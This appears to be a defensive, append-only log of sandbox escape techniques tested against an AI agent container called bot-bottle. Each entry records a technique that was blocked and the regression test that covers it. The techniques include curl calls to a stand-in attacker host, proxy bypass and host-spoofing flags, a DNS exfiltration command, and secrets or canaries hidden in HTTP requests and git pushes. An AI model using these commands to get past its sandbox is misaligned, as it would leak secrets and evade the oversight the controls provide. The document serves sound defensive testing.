# Sandbox Escape Attempt Corpus

Append-only log of attack techniques attempted against bot-bottle, each with a date,
description, outcome, and a reference to the regression test that catches it. New
techniques go at the bottom.

Every entry here has a corresponding test in
`tests/integration/test_sandbox_escape.py`.

---

## 2024 — Initial corpus

### 2024-XX-XX · Non-allowlisted hostname request
**Technique**: `curl https://evil.example.com/` from inside an agent.  
**Outcome**: Blocked. Egress proxy returns 403 with `egress:` marker before any upstream contact.  
**Test**: `test_non_allowlisted_hostname`

---

### 2024-XX-XX · Direct IP literal connect
**Technique**: `curl https://198.51.100.1/` (RFC 5737 documentation range).  
**Outcome**: Connection refused at network layer. Agent has no default gateway.  
**Test**: `test_non_allowlisted_ip_direct`

---

### 2024-XX-XX · Proxy bypass via --noproxy
**Technique**: `curl --noproxy '*' https://198.51.100.1/` to dial a public address without going through the egress proxy.  
**Outcome**: Blocked. Network isolation; no direct route off-host regardless of proxy settings.  
**Test**: `test_noproxy_bypass`

---

### 2024-XX-XX · Host header spoof (--resolve)
**Technique**: `curl --resolve api.anthropic.com:443:198.51.100.1 https://api.anthropic.com/` to misdirect an allowed hostname to an unrelated IP.  
**Outcome**: Blocked. Proxy keys policy on actual CONNECT target, not Host header. SNI checked against connection target.  
**Test**: `test_host_header_spoof_resolve`

---

### 2024-XX-XX · CONNECT tunnel with spoofed Host header
**Technique**: CONNECT to unlisted host, inner request sets `Host: api.anthropic.com`.  
**Outcome**: Blocked. Proxy refuses CONNECT to unlisted host before inner request is read.  
**Test**: `test_connect_tunnel_spoof`

---

### 2024-XX-XX · HTTP exfil via URL path
**Technique**: Embed secret in URL path of request to an allowed host.  
**Outcome**: Blocked. Outbound DLP (known-secrets detector) catches value in path before upstream contact.  
**Test**: `test_http_exfil_path`

---

### 2024-XX-XX · HTTP exfil via query string
**Technique**: Embed secret in query string of request to an allowed host.  
**Outcome**: Blocked. Outbound DLP catches value in query before upstream contact.  
**Test**: `test_http_exfil_query`

---

### 2024-XX-XX · HTTP exfil via request body
**Technique**: POST JSON body containing secret to an allowed host.  
**Outcome**: Blocked. Outbound DLP catches value in body before upstream contact.  
**Test**: `test_http_exfil_body`

---

### 2024-XX-XX · HTTP exfil via request header
**Technique**: Custom header (`X-Custom: <secret>`) on request to an allowed host.  
**Outcome**: Blocked. Outbound DLP catches value in headers before upstream contact.  
**Test**: `test_http_exfil_header`

---

### 2024-XX-XX · DNS exfil via crafted subdomain
**Technique**: Request to `$SECRET.api.anthropic.com` — looks allowlisted by substring but isn't.  
**Outcome**: Blocked. Exact-match allowlist rejects it; no DNS query is issued.  
**Test**: `test_dns_exfil_subdomain`

---

### 2024-XX-XX · DNS exfil via direct query to external resolver
**Technique**: `dig @8.8.8.8 "$SECRET.example.com"` — bypass proxy entirely, query external DNS.  
**Outcome**: Blocked. Network isolation; no route to 8.8.8.8. No response.  
**Test**: `test_dns_exfil_direct_query`

---

### 2024-XX-XX · Git push with GitHub token shape
**Technique**: Commit README containing `ghp_...` token, push via git-gate.  
**Outcome**: Blocked. gitleaks pre-receive hook finds the token before upstream SSH attempt.  
**Test**: `test_gitleaks_secret_in_push_github`

---

### 2024-XX-XX · Git push with Slack token shape
**Technique**: Commit file containing `xoxb-...` token, push via git-gate.  
**Outcome**: Blocked. gitleaks pre-receive hook.  
**Test**: `test_gitleaks_secret_in_push_slack`

---

### 2024-XX-XX · Git push with GitLab token shape
**Technique**: Commit file containing `glpat-...` token, push via git-gate.  
**Outcome**: Blocked. gitleaks pre-receive hook.  
**Test**: `test_gitleaks_secret_in_push_gitlab`

---

### 2024-XX-XX · Git push with shapeless secret (no gitleaks rule)
**Technique**: Commit file containing a bare hex secret with no known token prefix. gitleaks has no rule for this shape.  
**Outcome**: Blocked. Held-secret scan (`held_secret_scan.py`) catches the value by exact match on the bottle's registered `HELD_*` secrets.  
**Test**: `test_shapeless_secret_in_push`

---

### 2024-XX-XX · Git push containing per-session canary
**Technique**: Commit file containing the per-session `HELD_CANARY` value, push via git-gate.  
**Outcome**: Blocked. Held-secret scan catches canary value (included in `HELD_*` scan).  
**Test**: `test_canary_in_push`

---

### 2024-XX-XX · Canary exfil to allowlisted host via HTTP body
**Technique**: POST request body containing per-session `HELD_CANARY` to an *allowlisted* host.  
**Outcome**: Blocked. Canary detector in outbound DLP always hard-blocks regardless of route policy.  
**Test**: `test_canary_to_allowed_host`
